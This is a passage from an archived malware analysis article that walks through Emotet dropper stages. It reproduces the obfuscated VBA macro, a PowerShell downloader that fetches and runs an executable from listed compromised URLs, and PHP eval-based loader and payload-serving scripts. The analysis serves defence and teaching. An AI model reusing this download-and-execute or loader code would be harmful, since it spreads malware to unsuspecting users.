{
    "id": "e1061d8f-fd34-4404-ade2-9f658b208191",
    "created_at": "2023-01-12T15:04:41.177013Z",
    "updated_at": "2025-03-27T02:06:03.739363Z",
    "deleted_at": null,
    "sha1_hash": "9f5c37624fdd10cb494657c0dd4c12f685ec23be",
    "title": "2019-02-16 - Emotet droppers",
    "authors": "",
    "file_creation_date": "2022-05-28T03:50:20Z",
    "file_modification_date": "2022-05-28T03:50:20Z",
    "file_size": 171096,
    "plain_text": "# Emotet droppers\n\n**[maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/](https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/)**\n\n_This article was published on the 16th of February 2019. This article was updated on the_\n_19th of March 2020, and on the 3rd of November 2021._\n\nThe Emotet trojan has been active for multiple years and has delivered numerous payloads.\nIn the beginning, the trojan injected itself during the payment process of a purchase, but over\nthe years the malware has transitioned to also drop other trojans. At the time of writing, the\nmain spreading method is via spam campaigns. The e-mails contain a malicious attachment\nthat is often referred to as an invoice.\n\n## Table of contents\n\n Sample information\n\nThe samples were shared with me by b1nary on Telegram. Note that URLs in the macro\ndiffer from the wrongly configured website that is analysed later on. This has no influence on\nthe analysis, but it is pointed out for transparency. One can download all the required files\nfrom [VirusBay,](https://beta.virusbay.io/sample/browse/52b94921d9e57a2009fb0c562aab25bc) [Malware Bazaar, or](https://bazaar.abuse.ch/sample/59c3bb00017dd3bb1abd4d42d9a50df24fcd320bacf5335d1c030b772dc796c5/) [MalShare. Details are given below.](https://malshare.com/sample.php?action=detail&hash=52b94921d9e57a2009fb0c562aab25bc)\n```\nMD5: 52b94921d9e57a2009fb0c562aab25bc\nSHA-1: 32bcf8bbf7a5a3e88f4025179f4be9445b8e7ec8\nSHA-256: 59c3bb00017dd3bb1abd4d42d9a50df24fcd320bacf5335d1c030b772dc796c5\n\n## Prerequisite – PHP\n\n```\nLater on, PHP files will be analysed and executed to obtain data. For those following along,\nPHP needs to be installed. To install PHP on Debian based systems, one can simply use the\ncommand that is given below.\n```\nsudo apt-get install php7.2-cli\n\n```\n[For Windows, the information is given on the PHP site, which can be found here.](https://secure.php.net/manual/en/install.windows.legacy.index.php#install.windows.legacy.manual)\n\n## Stage 1 – The malicious macro\n\nThe attachment, which was received on the first of February 2019, is named Factura_OS_0689.doc. Upon opening it (with macros disabled, on a non Windows based system to avoid_\nan accidental infection), a social engineering attempt becomes apparent. Below, the text\nwithin the image is given.\n\n\n-----\n\n```\nThis document is protected\nTo open the document,\nfollow these steps:\nThis document is only available for desktop op laptop versions of Microsoft Office\nword\nClick Enable editing button from the yellow bar above\nOnce you have enabled editing, please click Enable content button from the yellow bar\nabove\n\n```\nAside from the oddly phrased sentences, this is an obvious attempt to lure an unsuspecting\nvictim into executing the payload of the document.\n\nThe document contains one form (named f), three modules (d40tNZH, tzUxn and VCAZiq)\nwith a single function in each module (respectively wFjUXJ, KKZUbw and love). To ensure\nthe execution of the macro when the file is opened, the Document_Open event is used. The\ncode that is executed when this event is triggered, is given below.\n```\nRem Attribute VBA_ModuleType=VBADocumentModule\nOption VBASupport 1\nSub Document_Open()\nIf 45 * 13 = 3562 - 3555 Then\ntDtKeGn = \"q6Cxy\"\nEnd If\nDim tu96ocCK As Single\ntu96ocCK = Round(20521.794670846)\nDim hAanT8Em2 As Double\nhAanT8Em2 = Sgn(58540.935390342)\nDim HMkjb As Long\nHMkjb = (3330 / 370) + (6)\nlove \"o\"\nEnd Sub\n\n```\nAt first, multiple variables are declared and instantiated. None of them are used within the\ncode after the instantiation. The function love is called at last, with a single parameter: the\nstring o. The code for the love function is given below.\n\n\n-----\n\n```\nRem Attribute VBA_ModuleType VBAModule\nOption VBASupport 1\nSub love(IdZALGS)\nDim EQUqVg9N As String\nEQUqVg9N = Len(YLPIkZX87)\nDim yDnCg14 As Long\nyDnCg14 = (818 - 791) - (13)\nDim yD7Emk2X5 As Long\nyD7Emk2X5 = -833133810\nDim T7056ZwR As Long\nT7056ZwR = Sgn(0)\nDim sBoDH7mZK As Boolean\nsBoDH7mZK = False\ncVMhaxQv = \"w\"\nCall Shell(KKZUbw(1) & IdZALGS & cVMhaxQv & wFjUXJ, 0)\nEnd Sub\n\n```\nThe lay-out of this function is similar to the previous one, in the sense that it first declares\nand instantiates multiple variables which are never used. Note that the function argument\n_IdZALGS is used and equals o. The Call Shell method contains all the malicious content._\nThe second argument (the 0) sets the window mode of the shell. The value zero equals\n_vbHide, meaning the shell window is hidden from the user._\n\nBelow, the functions KKZUbw(1) and wFjUXJ are analysed. The variable cVMhaxQv equals\n_w, as it is set to in the line above the Call Shell function. The shell command, in which the_\ntwo known variables are replaced by their value, is given below for context.\n```\nCall Shell(KKZUbw(1) & \"o\" & \"w\" & wFjUXJ, 0)\n\n```\nThe code for KKZUbw is given below.\n```\nRem Attribute VBA_ModuleType=VBAModule\nOption VBASupport 1\nPublic Function KKZUbw(OVOcS As Integer)\nDim FC4Vz As Integer\nFC4Vz = Sgn(-24987)\nKKZUbw = \"p\"\nEnd Function\n\n```\nThe provided variable OVOcS equals 1, as it was passed from love. Both the provided\nargument and the integer FC4Vz are never used. The function KKZUbw is set to equal p,\nwhich is the return value.\n\nFor additional context, the shell command with substituted variables, is given below.\n```\nCall Shell(\"p\" & \"o\" & \"w\" & wFjUXJ, 0)\n\n```\nThe last function that is called, is wFjUXJ. The code is given below.\n\n\n-----\n\n```\nRem Attribute VBA_ModuleType VBAModule\nOption VBASupport 1\nPublic Function wFjUXJ()\nDim ohw7OLNTg As Object\nSet ohw7OLNTg = New f\nDim YVyOsk As String\nYVyOsk = ohw7OLNTg.de.Text\nwFjUXJ = YVyOsk\nEnd Function\n\n```\nThe variable ohw7OLNTg is first declared as a generic object. One line later, it is defined as\n_f, the form object within the document. The form has a button, named es, which displays the_\ntext Cc3KM. Additionally, a textbox with the name de is present. The text within the textbox is\ngiven below.\n```\nershell $u5XQYhS = '$IY2E4 = new-obj6236.9355943074ect com6236.9355943074obj6236.9355943074ect\nwsc6236.9355943074ript.she6236.9355943074ll;$WrDq5hf = new-object\nsys6236.9355943074tem.net.web6236.9355943074client;$h2JAbj3E = new-object\nrandom;$Lcik8RtZ =\n\\\"6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://pr\ncourse.ru/7WN7n1n,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236\nadmin/Attachments/FJhztkIS,6236.9355943074h6236.9355943074t6236.9355943074t6236.935594\n = $h2JAbj3E.nex6236.9355943074t(1, 65536);$XqzWsIE =\n\\\"c:\\win6236.9355943074dows\\temp\\put6236.9355943074ty.exe\\\";for6236.9355943074each($VZ\n in $Lcik8RtZ)\n{try{$WrDq5hf.dow6236.9355943074nlo6236.9355943074adf6236.9355943074ile($VZxSuD9.ToS62\n $XqzWsIE);sta6236.9355943074rt-pro6236.9355943074cess\n$XqzWsIE;break;}catch{}}'.replace('6236.9355943074', $xZGUua);$Zvg3H6 =\n'';iex($u5XQYhS);\n\n```\nSince the pow should be in front, the first word in the string is powershell.\n\nThe complete script is given below.\n```\npowershell $u5XQYhS = '$IY2E4 = new-obj6236.9355943074ect com6236.9355943074obj6236.9355943074ect\nwsc6236.9355943074ript.she6236.9355943074ll;$WrDq5hf = new-object\nsys6236.9355943074tem.net.web6236.9355943074client;$h2JAbj3E = new-object\nrandom;$Lcik8RtZ =\n\\\"6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://pr\ncourse.ru/7WN7n1n,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236\nadmin/Attachments/FJhztkIS,6236.9355943074h6236.9355943074t6236.9355943074t6236.935594\n = $h2JAbj3E.nex6236.9355943074t(1, 65536);$XqzWsIE =\n\\\"c:\\win6236.9355943074dows\\temp\\put6236.9355943074ty.exe\\\";for6236.9355943074each($VZ\n in $Lcik8RtZ)\n{try{$WrDq5hf.dow6236.9355943074nlo6236.9355943074adf6236.9355943074ile($VZxSuD9.ToS62\n $XqzWsIE);sta6236.9355943074rt-pro6236.9355943074cess\n$XqzWsIE;break;}catch{}}'.replace('6236.9355943074', $xZGUua);$Zvg3H6 =\n'';iex($u5XQYhS);\n\n## Stage 2 – The dropped Powershell script\n\n```\n\n-----\n\nThe Powershell code is best read with a couple of new lines, as is seen below.\n```\n$u5XQYhS = '$IY2E4 = new-obj6236.9355943074ect com6236.9355943074obj6236.9355943074ect\nwsc6236.9355943074ript.she6236.9355943074ll;$WrDq5hf = new-object\nsys6236.9355943074tem.net.web6236.9355943074client;$h2JAbj3E = new-object\nrandom;$Lcik8RtZ =\n\\\"6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://pr\ncourse.ru/7WN7n1n,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236\nadmin/Attachments/FJhztkIS,6236.9355943074h6236.9355943074t6236.9355943074t6236.935594\n = $h2JAbj3E.nex6236.9355943074t(1, 65536);$XqzWsIE =\n\\\"c:\\win6236.9355943074dows\\temp\\put6236.9355943074ty.exe\\\";for6236.9355943074each($VZ\n in $Lcik8RtZ)\n{try{$WrDq5hf.dow6236.9355943074nlo6236.9355943074adf6236.9355943074ile($VZxSuD9.ToS62\n $XqzWsIE);sta6236.9355943074rt-pro6236.9355943074cess $XqzWsIE;break;}catch{}}'\n              .replace('6236.9355943074', $xZGUua);\n$Zvg3H6 = '';\niex($u5XQYhS);\n\n```\nThe variable $xZGUua is equal to nothing, hence the string 6236.9355943074 is simply\nremoved from the code above. Doing so results in readable code. To improve readability,\nsimply replace the semicolons with ;\\n in a text editor. After each command, a new line is\nadded. The readable code is given below.\n\nNote that iex($u5XQYhS); is used to execute the Powershell script that is described below.\nThe function iex stands for Invoke-Expression, as can be seen in the Microsoft\ndocumentation. Below, the script that will be executed is analysed.\n```\n$IY2E4 = new-object -comobject wscript.shell;\n$WrDq5hf = new-object system.net.webclient;\n$h2JAbj3E = new-object random;\n$Lcik8RtZ = \\\"http://pro-course.ru/7WN7n1n,http://tapchisuckhoengaynay.com/wpadmin/Attachments/FJhztkIS,http://de.thevoucherstop.com/TxJjRtZj,http://3kiloafvallen.\n$zKrReq4A = $h2JAbj3E.next(1, 65536);\n$XqzWsIE = \\\"c:\\windows\\temp\\putty.exe\\\";\nforeach($VZxSuD9 in $Lcik8RtZ){\n     try{\n          $WrDq5hf.downloadfile($VZxSuD9.ToString(), $XqzWsIE);\n          start-process $XqzWsIE;\n          break;\n     }catch{}\n}\n\n```\nThe first three variables, $IY2E4, $WrDq5hf and $h2JAbj3E, can be renamed based on the\nobject types. Their new names are, respectively, $wscriptShell, $webClient and\n_$randomGenerator._\n\nThe next variable, $Lcik8RtZ, is a string of URLs which is split, returning an array of URLs.\nHence, it can be renamed to $urlArray.\n\n\n-----\n\nThe result of the random generator ranges between 1 and 65535, since the last value is the\nlimit, which is excluded from the possible result. This equals the maximum value of a sixteen\nbit unsigned integer (uint16_t): two to the power 16. The result of the random generator is\nsaved in the variable $zKrReq4A. This variable can be refactored to $randomNumber.\n\nLastly, the variable $XqzWsIE is equal to the path where the file is downloaded to and\nexecuted from. As such, it can be refactored to $downloadedFile. The refactored code is\ngiven below.\n```\n$wscriptShell = new-object -comobject wscript.shell;\n$webClient = new-object system.net.webclient;\n$randomGenerator = new-object random;\n$urlArray = \\\"http://pro-course.ru/7WN7n1n,http://tapchisuckhoengaynay.com/wpadmin/Attachments/FJhztkIS,http://de.thevoucherstop.com/TxJjRtZj,http://3kiloafvallen.\n$randomNumber = $randomGenerator.next(1, 65536);\n$downloadedFile = \\\"c:\\windows\\temp\\putty.exe\\\";\nforeach($url in $urlArray){\n     try{\n          $webClient.downloadfile($url.ToString(), $downloadedFile);\n          start-process $downloadedFile;\n          break;\n     }catch{}\n}\n\n```\nThe script cycles through all the domain names and tries to download the next stage to the\nvictim’s computer, more specifically to C:\\windows\\temp\\putty.exe. If the download succeeds,\nthe downloaded file is executed. If an error occurs, the next URL is tried since the catch\nclause is left empty. If all of the URLs are unavailable, the script terminates and the victim’s\ndevice remains unaffected.\n\n## Stage 3 – The wrongly configured website\n\nGenerally, the visited site simply returns the payload. In this case, a wrongly configured\nwebsite was found, which let the site function as an open directory instead. The PHP file that\nis analysed in this stage, and the result of it (stage 4), are generally left unobserved, as it is\nserver sided code. The wrongly configured website is given below, although it is now\nunavailable.\n```\nhttp://adsuide.club/y77QTKhV/\n\n```\nThe content of the PHP file was beautified to increase the readability. Note that the payload\nis omitted here due to its length, namely 196 393 characters. The code is given below.\n\n\n-----\n\n```\n<?php\nfunction fn5c62c1bcb819b($s) {\n     $x = '';\n     for ($i = 0, $n = strlen($s); $i < $n; $i+= 2)\n          {\n          $x.= pack('H*', substr($s, $i, 2));\n          }\n     return $x;\n}\n$n5c62c1bcb81d1 =\nfn5c62c1bcb819b('6576616c28677a696e666c617465286261736536345f6465636f64652822');\n$n5c62c1bcb8206 = fn5c62c1bcb819b('222929293b');\neval($n5c62c1bcb81d1 . '[omitted due to size]' . $n5c62c1bcb8206);\n\n```\n[The function fn5c62c1bcb819b is used to transform two strings using the pack function from](https://secure.php.net/manual/en/function.pack.php)\nPHP. The H is used to provide information about the string type, in this case hexadecimal\nwith the high nibble first. The asterisk is used to indicate that the whole string should be\ntaken into account. The function can therefore be refactored to decode.\n\nThe variables $n5c62c1bcb81d1 and $n5c62c1bcb8206 are equal to the result of the decode\nfunction. Decoding both strings provides provides more information. In the code below, the\n\n_[base64-encoded-value-here] is where the payload originally resided._\n```\neval(gzinflate(base64_decode(\"[base64-encoded-value-here]\")));\n\n```\nThe data is encoded in two ways, meaning it should be decoded before it can be executed.\nThe complete function is given below. Note that the _[eval function call has been removed,](https://secure.php.net/manual/en/function.eval.php)_\n[since the payload shouldn’t be executed. Instead, it has been replaced with file_put_contents](https://secure.php.net/manual/en/function.file-put-contents.php)\nto save the file for a more detailed analysis. The path that has been used, should be\nabsolute.\n\n\n-----\n\n```\n<?php\nfunction decode($stringToDecode) {\n     $output = '';\n     for ($i = 0, $n = strlen($stringToDecode); $i < $n; $i+= 2) {\n          $output.= pack('H*', substr($stringToDecode, $i, 2));\n     }\n     return $output;\n}\n$commandPart1 =\ndecode('6576616c28677a696e666c617465286261736536345f6465636f64652822');\n$commandPart2 = decode('222929293b');\necho \"Command equals:\\n\";\necho $commandPart1 . \"[base64-encoded-value-here]\" . $commandPart2 . \"\\n\";\nfile_put_contents(\"/home/libra/Desktop/emotet/stage4.php\",\n(gzinflate(base64_decode('[omitted due to size]'))));\n\n```\nNote that the file that is written to the disk is a PHP file, since the _[eval function executes the](https://secure.php.net/manual/en/function.eval.php)_\ngiven string as PHP code.\n\n## Stage 4 – Returning the payload\n\nThe complete beautified PHP file is given below. To retain readability, it will be analysed in\nparts.\n\n\n-----\n\n```\n<?php\nerror_reporting(0);\nset_time_limit(0);\nini_set('max_execution_time', 0);\nini_set('memory_limit', -1);\nheader('Expires: Tue, 01 Jan 1970 00:00:00 GMT');\nheader('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');\nheader('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');\nheader('Cache-Control: post-check=0, pre-check=0', false);\nheader('Pragma: no-cache');\nif (function_exists('opcache_invalidate')) {\n     opcache_invalidate(__FILE__, true);\n}\nclass O\n{\n     private $content_ = '[omitted due to size]';\n     private $contentName_ = 'iMDbapCVgUb.exe';\n     private $contentType_ = 'application/octet-stream';\n     private $regex_ = array(\n          array(\n              '(?:(?:Orca-)?Android|Adr)[ /](?:[a-z]+ )?(\\\\d+[\\\\.\\\\d]+)',\n              'Android|Silk-Accelerated=[a-z]{4,5}\n',\n              'BeyondPod|AntennaPod|Podkicker|DoggCatcher|Player\nFM|okhttp|Podcatcher Deluxe'\n          ),\n          array(\n              'CFNetwork/758\\\\.4\\\\.3',\n              'CFNetwork/758\\\\.3\\\\.15',\n              'CFNetwork/758\\\\.2\\\\.[78]',\n              'CFNetwork/758\\\\.1\\\\.6',\n              'CFNetwork/758\\\\.0\\\\.2',\n              'CFNetwork/711\\\\.5\\\\.6',\n              'CFNetwork/711\\\\.4\\\\.6',\n              'CFNetwork/711\\\\.3\\\\.18',\n              'CFNetwork/711\\\\.2\\\\.23',\n              'CFNetwork/711\\\\.1\\\\.1[26]',\n              'CFNetwork/711\\\\.0\\\\.6',\n              'CFNetwork/672\\\\.1',\n              'CFNetwork/672\\\\.0',\n              'CFNetwork/609\\\\.1',\n              'CFNetwork/60[29]',\n              'CFNetwork/548\\\\.1',\n              'CFNetwork/548\\\\.0',\n              'CFNetwork/485\\\\.13',\n              'CFNetwork/485\\\\.12',\n              'CFNetwork/485\\\\.10',\n              'CFNetwork/485\\\\.2',\n              'CFNetwork/467\\\\.12',\n              'CFNetwork/459',\n              '(?:CPU OS|iPh(?:one)?[ _]OS|iOS)[ _/](\\\\d+(?:[_\\\\.]\\\\d+)*)',\n              '(?:Apple-)?(?:iPhone|iPad|iPod)(?:.*Mac OS\n\n```\n\n-----\n\n```\nX. Version/(\\\\d+\\\\.\\\\d+)|;\n Opera)?',\n              'Podcasts/(?:[\\\\d\\\\.]+)|Instacast(?:HD)?/(?:\\\\d\\\\.\n[\\\\d\\\\.abc]+)|Pocket Casts, iOS|Overcast|Castro|Podcat|i[cC]atcher',\n              'iTunes-(iPod|iPad|iPhone)/(?:[\\\\d\\\\.]+)'\n          ),\n          array(\n              'Maemo',\n              'Arch ?Linux(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?',\n              'VectorLinux(?: package)?(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?',\n              'Linux;\n .*((?:Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red\nHat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack))[ /](\\\\d+[\\\\.\\\\d]+)',\n'(Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red\nHat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack)(?:(?: Enterprise)?\nLinux)?(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?',\n              'Linux(?:OS)?[^a-z]'\n          ),\n          array(\n              'CFNetwork/760',\n              'CFNetwork/720',\n              'CFNetwork/673',\n              'CFNetwork/596',\n              'CFNetwork/520',\n              'CFNetwork/454',\n              'CFNetwork/(?:438|422|339|330|221|220|217)',\n              'CFNetwork/12[89]',\n              'CFNetwork/1\\\\.2',\n              'CFNetwork/1\\\\.1',\n              'Mac OS X(?: (?:Version )?(\\\\d+(?:[_\\\\.]\\\\d+)+))?',\n              'Mac (\\\\d+(?:[_\\\\.]\\\\d+)+)',\n              'Darwin|Macintosh|Mac_PowerPC|PPC|Mac PowerPC|iMac|MacBook'\n          ),\n          array(\n              'CYGWIN_NT-10.0|Windows NT 10.0|Windows 10',\n              'CYGWIN_NT-6.4|Windows NT 6.4|Windows 10',\n              'CYGWIN_NT-6.3|Windows NT 6.3|Windows 8.1',\n              'CYGWIN_NT-6.2|Windows NT 6.2|Windows 8',\n              'CYGWIN_NT-6.1|Windows NT 6.1|Windows 7',\n              'CYGWIN_NT-6.0|Windows NT 6.0|Windows Vista',\n              'CYGWIN_NT-5.2|Windows NT 5.2|Windows Server 2003 / XP x64',\n              'CYGWIN_NT-5.1|Windows NT 5.1|Windows XP'\n          ),\n          array(\n              '.?'\n          )\n     );\n     private function spabbd98($sp1bd672)\n     {\n          foreach($this->regex_ as $spda961f => $spd59ff0) {\n              foreach($spd59ff0 as $sp439cf2) {\n                   $sp439cf2 = '/(?:^|[^A-Z_-])(?:' . str_replace('/',\n'\\\\/', $sp439cf2) . ')/i';\n                   if (preg_match($sp439cf2, $sp1bd672)) {\n\n```\n\n-----\n\n```\n                        return $spda961f;\n                   }\n              }\n          }\n          return -1;\n     }\n     public function execute()\n     {\n          $sp1cb870 = '.' . sha1(basename(dirname(__FILE__)));\n          touch($sp1cb870);\n          $spdfc158 = fopen($sp1cb870, 'r+');\n          if ($spdfc158 !== false) {\n              if (flock($spdfc158, LOCK_EX)) {\n                   $sp7c7c2a = array();\n                   $spe8c644 = filesize($sp1cb870);\n                   if ($spe8c644 > 0) {\n                        $sp7c7c2a = json_decode(fread($spdfc158,\n$spe8c644), true);\n                   }\n                   $sp6345e2 = isset($_SERVER['HTTP_USER_AGENT']) ?\n$_SERVER['HTTP_USER_AGENT'] : '';\n                   $spda961f = $this->spabbd98($sp6345e2);\n                   if ($spda961f > 0) {\n                        if (!isset($sp7c7c2a[$spda961f]) ||\n!is_int($sp7c7c2a[$spda961f])) {\n                             $sp7c7c2a[$spda961f] = 0;\n                        }\n                        $sp7c7c2a[$spda961f]++;\n                   }\n                   fseek($spdfc158, 0);\n                   fwrite($spdfc158, json_encode($sp7c7c2a));\n                   fflush($spdfc158);\n                   flock($spdfc158, LOCK_UN);\n              }\n              fclose($spdfc158);\n          }\n          header('Content-Type: ' . $this->contentType_);\n          header('Content-Disposition: attachment;\n filename=\"' . $this->contentName_ . '\"');\n          header('Content-Transfer-Encoding: binary');\n          return base64_decode($this->content_);\n     }\n}\nif ($_SERVER['QUERY_STRING']) {\n     die($_SERVER['QUERY_STRING']);\n}\n\n```\n\n-----\n\n```\nif ($_SERVER[ REQUEST_METHOD ] ! GET ) {\n     die(uniqid());\n}\n$sp58859d = new O();\necho $sp58859d->execute();\n\n```\nThe first observation that can be made is the separation of the checks that are executed\nbased on the visitor’s request and the payload that is decoded. At first, the checks are\nanalysed. After that, the code that decodes the payload is analysed.\n```\n<?php\nerror_reporting(0);\nset_time_limit(0);\nini_set('max_execution_time', 0);\nini_set('memory_limit', -1);\nheader('Expires: Tue, 01 Jan 1970 00:00:00 GMT');\nheader('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');\nheader('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');\nheader('Cache-Control: post-check=0, pre-check=0', false);\nheader('Pragma: no-cache');\nif (function_exists('opcache_invalidate')) {\n     opcache_invalidate(__FILE__, true);\n}\n\n```\n[The function error_reporting sets which errors are reported. The argument, in this case the](https://secure.php.net/manual/en/function.error-reporting.php)\nvalue 0, ensures that no reporting takes place.\n\n[To avoid timing out, the function set_time_limit is set to an unlimited amount of time, by using](https://secure.php.net/manual/en/function.set-time-limit.php)\nthe value 0.\n\n[Additionally, the user can set custom variables using the ini_set function. The variables](https://secure.php.net/manual/en/function.ini-set.php)\n_max_execution_time and memory_limit are set to an indefinite amount of time and memory._\n\nThe _[header is set to expire in the past, causing it to be invalidated immediately. Furthermore,](https://secure.php.net/manual/en/function.header.php)_\n[any form of caching is disabled. The opcache_invalidate function is used to invalidate a](https://secure.php.net/manual/en/function.opcache-invalidate.php)\n[cached script, which equals the magic constant __FILE__. This constant refers to the full](https://secure.php.net/manual/en/language.constants.predefined.php)\npath and filename of the file from which it is called. The boolean, which equals true, defines if\nthe cache should be cleared forcefully.\n\nThe cache is emptied and avoided to never keep a copy of the payload on the server, other\nthan the script itself.\n\nWhen a user visits the site, several checks are executed. If both checks are passed, a new\nobject is instantiated and a method of this object is invoked. The code is given below.\n\n\n-----\n\n```\nclass O {\n     #code omitted\n}\nif ($_SERVER['QUERY_STRING']) {\n     die($_SERVER['QUERY_STRING']);\n}\nif ($_SERVER['REQUEST_METHOD'] != 'GET') {\n     die(uniqid());\n}\n$sp58859d = new O();\necho $sp58859d->execute();\n\n```\n[The variable $_SERVER is used to request information about the server and the way the](https://secure.php.net/manual/en/reserved.variables.server.php)\nPHP script is loaded. The variable QUERY_STRING is used to obtain the query string. If any\nadditional parameters are present in the URL, the if-statement returns true.\n\n[The function die is similar to the](https://secure.php.net/manual/en/function.die.php) _[exit function: it displays a message and terminates the](https://secure.php.net/manual/en/function.exit.php)_\nscript.\n\nLastly, the function _[uniqid is used to generate a unique id. If the request method for the page](https://secure.php.net/manual/en/function.uniqid.php)_\nis not equal to the HTTP GET method, the script is terminated as well.\n\nIf both conditions are met, a new object is defined and instantiated: $sp58859d. After that,\nthe execute function is called. The invoked method is part of the class named O, which is\ngiven below in parts.\n```\nclass O\n{\n     private $content_ = '[omitted due to size]';\n     private $contentName_ = 'iMDbapCVgUb.exe';\n     private $contentType_ = 'application/octet-stream';\n\n```\nThe class has multiple private variables. The $content_ is omitted due to its size (292 911\ncharacters), but contains the encoded payload. The $contentName_ is the file name and the\n_$contentType_ is the type of file that will be returned, in this case an application._\n\nBelow, the $regex_ variable is given.\n\n\n-----\n\n```\n     private $regex_ array(\n          array(\n              '(?:(?:Orca-)?Android|Adr)[ /](?:[a-z]+ )?(\\\\d+[\\\\.\\\\d]+)',\n              'Android|Silk-Accelerated=[a-z]{4,5}\n',\n              'BeyondPod|AntennaPod|Podkicker|DoggCatcher|Player\nFM|okhttp|Podcatcher Deluxe'\n          ),\n          array(\n              'CFNetwork/758\\\\.4\\\\.3',\n              'CFNetwork/758\\\\.3\\\\.15',\n              'CFNetwork/758\\\\.2\\\\.[78]',\n              'CFNetwork/758\\\\.1\\\\.6',\n              'CFNetwork/758\\\\.0\\\\.2',\n              'CFNetwork/711\\\\.5\\\\.6',\n              'CFNetwork/711\\\\.4\\\\.6',\n              'CFNetwork/711\\\\.3\\\\.18',\n              'CFNetwork/711\\\\.2\\\\.23',\n              'CFNetwork/711\\\\.1\\\\.1[26]',\n              'CFNetwork/711\\\\.0\\\\.6',\n              'CFNetwork/672\\\\.1',\n              'CFNetwork/672\\\\.0',\n              'CFNetwork/609\\\\.1',\n              'CFNetwork/60[29]',\n              'CFNetwork/548\\\\.1',\n              'CFNetwork/548\\\\.0',\n              'CFNetwork/485\\\\.13',\n              'CFNetwork/485\\\\.12',\n              'CFNetwork/485\\\\.10',\n              'CFNetwork/485\\\\.2',\n              'CFNetwork/467\\\\.12',\n              'CFNetwork/459',\n              '(?:CPU OS|iPh(?:one)?[ _]OS|iOS)[ _/](\\\\d+(?:[_\\\\.]\\\\d+)*)',\n              '(?:Apple-)?(?:iPhone|iPad|iPod)(?:.*Mac OS\nX.*Version/(\\\\d+\\\\.\\\\d+)|;\n Opera)?',\n              'Podcasts/(?:[\\\\d\\\\.]+)|Instacast(?:HD)?/(?:\\\\d\\\\.\n[\\\\d\\\\.abc]+)|Pocket Casts, iOS|Overcast|Castro|Podcat|i[cC]atcher',\n              'iTunes-(iPod|iPad|iPhone)/(?:[\\\\d\\\\.]+)'\n          ),\n          array(\n              'Maemo',\n              'Arch ?Linux(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?',\n              'VectorLinux(?: package)?(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?',\n              'Linux;\n .*((?:Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red\nHat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack))[ /](\\\\d+[\\\\.\\\\d]+)',\n'(Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red\nHat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack)(?:(?: Enterprise)?\nLinux)?(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?',\n              'Linux(?:OS)?[^a-z]'\n          ),\n          array(\n              'CFNetwork/760',\n\n```\n\n-----\n\n```\n               CFNetwork/720,\n              'CFNetwork/673',\n              'CFNetwork/596',\n              'CFNetwork/520',\n              'CFNetwork/454',\n              'CFNetwork/(?:438|422|339|330|221|220|217)',\n              'CFNetwork/12[89]',\n              'CFNetwork/1\\\\.2',\n              'CFNetwork/1\\\\.1',\n              'Mac OS X(?: (?:Version )?(\\\\d+(?:[_\\\\.]\\\\d+)+))?',\n              'Mac (\\\\d+(?:[_\\\\.]\\\\d+)+)',\n              'Darwin|Macintosh|Mac_PowerPC|PPC|Mac PowerPC|iMac|MacBook'\n          ),\n          array(\n              'CYGWIN_NT-10.0|Windows NT 10.0|Windows 10',\n              'CYGWIN_NT-6.4|Windows NT 6.4|Windows 10',\n              'CYGWIN_NT-6.3|Windows NT 6.3|Windows 8.1',\n              'CYGWIN_NT-6.2|Windows NT 6.2|Windows 8',\n              'CYGWIN_NT-6.1|Windows NT 6.1|Windows 7',\n              'CYGWIN_NT-6.0|Windows NT 6.0|Windows Vista',\n              'CYGWIN_NT-5.2|Windows NT 5.2|Windows Server 2003 / XP x64',\n              'CYGWIN_NT-5.1|Windows NT 5.1|Windows XP'\n          ),\n          array(\n              '.?'\n          )\n     );\n\n```\nThe array consists of arrays, each of which defines a different operating system group. At\nindex zero, Android names are matched. The first index contains information about iPhones,\niPads and iPods. The second index contains information about Linux distributions. The third\nindex contains information about MacOS systems. The fourth index contains different\nversions of the Windows operating system. At last, a regex for any character except newlines\nis used. This match serves as the other category.\n\nBelow the function that uses the $regex_ variable is given.\n```\n     private function spabbd98($sp1bd672)\n     {\n          foreach($this->regex_ as $spda961f => $spd59ff0) {\n              foreach($spd59ff0 as $sp439cf2) {\n                   $sp439cf2 = '/(?:^|[^A-Z_-])(?:' . str_replace('/',\n'\\\\/', $sp439cf2) . ')/i';\n                   if (preg_match($sp439cf2, $sp1bd672)) {\n                        return $spda961f;\n                   }\n              }\n          }\n          return -1;\n     }\n\n```\n\n-----\n\nThe variable $spd59ff0 can be renamed to $forEachValue since it equals the current value of\nthe array that is being looped through. As such, the variable $sp439cf2 can be renamed to\n_$nestedArray._\n\n[The function preg_match performs a regular expression (the first argument) on a string (the](https://secure.php.net/manual/en/function.preg-match.php)\nsecond argument). The variable $sp1bd672 can thus be refactored to $regexSubject. At last,\nthe variable $spda961f is returned. This variable equals the operating system that was\nmatched. As such, it can be renamed to 